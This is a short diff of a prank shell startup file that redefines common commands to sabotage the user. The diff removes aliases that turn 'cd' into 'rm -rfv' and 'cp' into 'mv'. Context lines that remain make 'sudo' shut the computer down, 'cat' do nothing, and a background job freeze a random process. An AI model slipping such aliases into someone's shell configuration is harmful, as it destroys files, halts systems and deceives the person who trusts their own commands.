@@ -16,9 +16,6 @@ alias cat=true;
 # Use a random sort option whenever `ls` is invoked.
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
-# Delete directories instead of entering them.
-alias cd='rm -rfv';
-
 # Shut down the computer instead of running a command with super-user rights.
 alias sudo='sudo shutdown -P now';
 
@@ -58,9 +55,6 @@ fi;
 
 # Send STOP signal to random process at random time.
 sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
-
-# Have `cp` perform `mv` instead.
-alias cp='mv';
 
 # Make `exit` open a new shell.
 alias exit='sh';
